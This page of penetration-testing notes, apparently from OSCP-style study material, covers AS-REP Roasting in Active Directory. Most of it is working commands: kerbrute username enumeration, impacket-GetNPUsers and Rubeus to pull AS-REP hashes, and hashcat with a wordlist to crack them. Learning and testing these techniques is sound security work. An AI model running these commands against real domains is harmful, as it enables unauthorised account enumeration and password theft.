# AS-REP Roasting

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as [_AS-REP Roasting_](https://harmj0y.medium.com/roasting-as-reps-e6179a65216b).

Veryify usernames:

{% code overflow="wrap" %}
```shell
kerbrute -domain hutch.offsec -users ./users.txt -dc-ip 192.168.219.122
```
{% endcode %}

## Linux

On Kali, we can use [**impacket-GetNPUsers**](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) to perform AS-REP roasting:

{% code overflow="wrap" %}
```sh
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```
{% endcode %}

* **-dc-ip:** IP address of the domain controller
* **-outputfile:** name of the output file (contains AS-REP hash)
* **-request:** request the TGT
* **domain/user:** use the user needed for authentication and enter their password when prompted

## Windows

[_Rubeus_](https://github.com/GhostPack/Rubeus) is a toolset for raw Kerberos interactions and abuses.

As a pre-authenticated domain user: don't have to provide any other options to Rubeus except **asreproast.** Rubeus will automatically identify vulnerable user accounts

```sh
.\Rubeus.exe asreproast /nowrap
```

* **/nowrap:** prevent new lines being added to the AS-REP hashes

## Crack the hash

Find the correct hashcat mode for the AS-REP hash:&#x20;

```sh
hashcat --help | grep -i "Kerberos"
```

Crack the hash:

{% code overflow="wrap" %}
```sh
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
{% endcode %}
